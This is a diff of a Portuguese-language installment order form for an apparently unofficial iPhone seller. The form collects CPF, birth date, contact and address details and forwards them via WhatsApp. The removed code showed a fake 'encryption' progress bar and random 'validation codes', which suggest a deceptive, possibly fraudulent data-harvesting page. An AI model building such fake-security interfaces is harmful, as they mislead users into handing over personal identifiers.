@@ -32,13 +32,23 @@ label {
     display:block;
 }
 
-input, select, textarea {
+input, select {
     width:100%;
     padding:14px;
     margin-top:5px;
     border-radius:12px;
     border:1px solid #d2d2d7;
     background:#fafafa;
+}
+
+textarea {
+    width:100%;
+    padding:14px;
+    margin-top:5px;
+    border-radius:12px;
+    border:1px solid #d2d2d7;
+    background:#fafafa;
+    min-height:80px;
 }
 
 button {
@@ -67,7 +77,7 @@ button {
 <div class="container">
 
 <h2>Versus Apple Oficial</h2>
-<div class="insta">iPhones & Acessórios • Central de Vendas</div>
+<div class="insta">@versusappleoficial</div>
 
 <h3>Dados Pessoais</h3>
 
@@ -86,15 +96,6 @@ button {
 <label>Telefone (WhatsApp)</label>
 <input id="telefone">
 
-<label>Renda mensal</label>
-<select id="renda">
-<option value="">Selecione</option>
-<option>Até R$1.500</option>
-<option>R$1.500 a R$3.000</option>
-<option>R$3.000 a R$5.000</option>
-<option>Acima de R$5.000</option>
-</select>
-
 <h3>Compra</h3>
 
 <label>Aparelhos com disponibilidade</label>
@@ -102,27 +103,31 @@ button {
 <option value="">Selecione</option>
 <option>11 Pro Max 256GB</option>
 <option>12 Pro Max 256GB</option>
-<option>13 256GB</option>
+<option>13 Normal 256GB</option>
 <option>13 Pro Max 256GB</option>
-<option>14 256GB</option>
+<option>14 Normal 256GB</option>
 <option>14 Pro 256GB</option>
 <option>14 Pro Max 256GB</option>
-<option>15 256GB</option>
+<option>15 Normal 256GB</option>
 <option>15 Plus 256GB</option>
 <option>15 Pro 256GB</option>
 <option>15 Pro Max 256GB</option>
-<option>16 256GB</option>
+<option>16 Normal 256GB</option>
 <option>16 Pro 256GB</option>
 <option>16 Pro Max 256GB</option>
-<option>17 256GB</option>
+<option>17 Normal 256GB</option>
 <option>17 Air 256GB</option>
 <option>17 Pro 256GB</option>
 <option>17 Pro Max 256GB</option>
 <option>PlayStation 5 Slim 1TB</option>
 </select>
 
-<label>Dia de vencimento</label>
+<label>Dia de vencimento das parcelas</label>
 <input id="vencimento">
+
+<div style="font-size:12px; color:#777; margin-top:5px;">
+Cores a consultar com o atendente
+</div>
 
 <h3>Endereço</h3>
 
@@ -144,68 +149,42 @@ button {
 <label>Estado</label>
 <input id="estado">
 
+<!-- NOVO CAMPO -->
 <label>Observações para entrega</label>
-<textarea id="observacao"></textarea>
+<textarea id="observacao" placeholder="Ex: casa nos fundos, portão preto..."></textarea>
 
+<!-- NOVO ACEITE -->
 <label style="display:flex;align-items:center;margin-top:15px;">
 <input type="checkbox" id="termos" style="width:auto;margin-right:10px;">
-Aceito os termos e responsabilidade financeira
+Li e aceito os termos de compra
 </label>
 
-<label>Assinatura digital</label>
-<input id="assinatura">
-
-<button onclick="enviar()">Continuar para Análise de Crédito</button>
+<button onclick="enviar()">Finalizar Cadastro</button>
 
 <div class="footer">
-🔒 Ambiente seguro • Dados protegidos
+🔒 Seus dados são utilizados apenas para análise e envio do pedido.
 </div>
 
 </div>
 
 <script>
 
-// máscara telefone
-document.getElementById("telefone").addEventListener("input", function(e){
- let v = e.target.value.replace(/\D/g,"");
- if(v.length > 11) v = v.slice(0,11);
- if(v.length > 10){
-  v = v.replace(/^(\d{2})(\d{5})(\d{4}).*/, "($1) $2-$3");
- } else if(v.length > 6){
-  v = v.replace(/^(\d{2})(\d{4})(\d{0,4}).*/, "($1) $2-$3");
- } else if(v.length > 2){
-  v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
- } else {
-  v = v.replace(/^(\d*)/, "($1");
- }
- e.target.value = v;
-});
-
-// CEP
+// CEP automático
 function buscarCEP(){
  let cep = document.getElementById("cep").value.replace(/\D/g,'');
  if(cep.length==8){
  fetch(`https://viacep.com.br/ws/${cep}/json/`)
  .then(r=>r.json())
  .then(d=>{
-  rua.value=d.logradouro||"";
-  bairro.value=d.bairro||"";
-  cidade.value=d.localidade||"";
-  estado.value=d.uf||"";
+  document.getElementById("rua").value=d.logradouro||"";
+  document.getElementById("bairro").value=d.bairro||"";
+  document.getElementById("cidade").value=d.localidade||"";
+  document.getElementById("estado").value=d.uf||"";
  });
  }
 }
 
-// gerar
-function gerarProtocolo(){
- return "VS" + Math.floor(Math.random() * 1000000000);
-}
-
-function gerarCodigo(){
- return Math.random().toString(36).substring(2,8).toUpperCase();
-}
-
-// enviar
+// ENVIAR
 function enviar(){
 
 let nome = document.getElementById("nome").value;
@@ -213,7 +192,6 @@ let cpf = document.getElementById("cpf").value;
 let nascimento = document.getElementById("nascimento").value;
 let email = document.getElementById("email").value;
 let telefone = document.getElementById("telefone").value;
-let renda = document.getElementById("renda").value;
 
 let aparelho = document.getElementById("aparelho").value;
 let vencimento = document.getElementById("vencimento").value;
@@ -225,9 +203,9 @@ let bairro = document.getElementById("bairro").value;
 let cidade = document.getElementById("cidade").value;
 let estado = document.getElementById("estado").value;
 
+// NOVOS
 let observacao = document.getElementById("observacao").value;
 let termos = document.getElementById("termos").checked;
-let assinatura = document.getElementById("assinatura").value;
 
 if(!nome || !cpf || !telefone || !aparelho){
  alert("Preencha os campos obrigatórios");
@@ -235,94 +213,36 @@ if(!nome || !cpf || !telefone || !aparelho){
 }
 
 if(!termos){
- alert("Aceite os termos");
+ alert("Você precisa aceitar os termos para continuar");
  return;
 }
 
-if(!assinatura){
- alert("Assinatura obrigatória");
- return;
-}
+let mensagem = `Cadastro - Versus Apple Oficial
 
-// LOADING
-document.body.innerHTML = `
-<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#a855f7;font-family:sans-serif;">
-<div style="width:300px;">
-
-<h2 style="text-align:center;color:#c084fc;">🔐 Processamento Seguro</h2>
-
-<div style="height:8px;background:#222;border-radius:10px;margin:20px 0;">
-<div id="barra" style="height:100%;width:0%;background:#a855f7;border-radius:10px;"></div>
-</div>
-
-<p id="porcentagem" style="text-align:center;">0%</p>
-<p id="status" style="text-align:center;margin-top:15px;"></p>
-
-</div>
-</div>
-`;
-
-let progresso = 0;
-
-let etapas = [
- {p:10, txt:"🔐 Criptografando dados..."},
- {p:30, txt:"📄 Validando informações..."},
- {p:55, txt:"📡 Consultando sistema..."},
- {p:75, txt:"🧾 Gerando contrato..."},
- {p:90, txt:"⚙️ Finalizando análise..."},
- {p:100, txt:"✅ Concluído"}
-];
-
-let etapaAtual = 0;
-
-let intervalo = setInterval(()=>{
-
-progresso += 0.8;
-
-barra.style.width = progresso + "%";
-porcentagem.innerText = Math.floor(progresso) + "%";
-
-if(etapaAtual < etapas.length && progresso >= etapas[etapaAtual].p){
- status.innerText = etapas[etapaAtual].txt;
- etapaAtual++;
-}
-
-if(progresso >= 100){
- clearInterval(intervalo);
-
-setTimeout(()=>{
-
-let protocolo = gerarProtocolo();
-let codigo = gerarCodigo();
-
-let mensagem = `📄 FORMALIZAÇÃO DE COMPRA - VERSUS APPLE OFICIAL
-
-Protocolo: ${protocolo}
-Código de validação: ${codigo}
-
-👤 Nome: ${nome}
+Nome: ${nome}
 CPF: ${cpf}
+Nascimento: ${nascimento}
+E-mail: ${email}
 Telefone: ${telefone}
 
 📱 Aparelho: ${aparelho}
+📅 Vencimento: ${vencimento}
 
-📍 Endereço:
-${rua}, ${numero} - ${bairro}
-${cidade}/${estado}
+Endereço:
 CEP: ${cep}
+Rua: ${rua}, Nº ${numero}
+Bairro: ${bairro}
+Cidade: ${cidade}
+Estado: ${estado}
 
 Observações: ${observacao}
 
-Assinatura: ${assinatura}
+🌐 Site:
+https://sandwiche.me/vsapplestore`;
 
-Em instantes você receberá as instruções de compra do dispositivo.`;
+let url = "https://wa.me/5511944967694?text=" + encodeURIComponent(mensagem);
 
-window.location.href = "https://wa.me/5511944967694?text=" + encodeURIComponent(mensagem);
-
-},800);
-}
-
-},40);
+window.location.href = url;
 
 }
 </script>
